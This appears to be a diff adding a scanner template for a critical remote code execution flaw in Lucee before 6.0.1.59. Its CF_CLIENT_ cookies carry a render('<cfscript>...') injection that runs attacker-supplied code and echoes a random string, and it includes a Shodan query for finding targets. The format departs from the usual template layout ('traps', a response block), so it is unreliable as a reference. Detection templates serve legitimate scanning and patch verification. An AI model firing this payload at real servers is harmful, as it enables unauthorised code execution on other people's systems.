@@ -1,0 +1,25 @@
+id: lucee-rce
+info:
+  name: Lucee < 6.0.1.59 - Remote Code Execution
+  author: rootxharsh,iamnoooob,pdresearch
+  description: null
+  severity: critical
+  reference:
+  - https://blog.projectdiscovery.io/hello-lucee-let-us-hack-apple-again
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.title:"Lucee"
+  tags: lucee,rce,oast
+traps:
+- request:
+    method: GET
+    path: /
+    headers:
+      Cookie: CF_CLIENT_=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>');
+        CF_CLIENT_LUCEE=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>');
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: '{{randstr}}'
